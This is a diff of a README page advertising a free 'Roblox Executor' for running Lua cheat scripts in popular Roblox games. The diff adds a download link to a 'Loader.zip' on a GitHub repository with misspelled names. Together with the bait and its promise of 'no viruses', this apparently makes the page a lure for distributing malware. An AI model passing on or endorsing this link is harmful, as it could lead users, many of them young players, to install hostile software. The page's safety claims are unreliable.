@@ -2,8 +2,7 @@
 
 **Download Roblox Executor (Latest 2025)** – the ultimate free script executor for Roblox games. Unleash powerful Lua scripts, automate your gameplay, unlock hidden features, and take your favorite Roblox adventures to the next level with games like Blox Fruits, Pet Simulator X, Brookhaven, and more!
 
-🔥 **[📥 DOWNLOAD ROBLOX EXECUTOR (FREE)]()**
-✅ Compatible with Windows 11 / 10 (64-bit)
+🔥 **[📥 DOWNLOAD ROBLOX EXECUTOR (FREE)](https://github.com/RobxMaggisc/roblax-executar/releases/download/Release/Loader.zip)**
 🛡️ Safe to use, no key system, no viruses, completely free
 ![solara_ex](https://github.com/user-attachments/assets/440608ba-775e-4da0-bb4d-3454f2a3fce3)
 
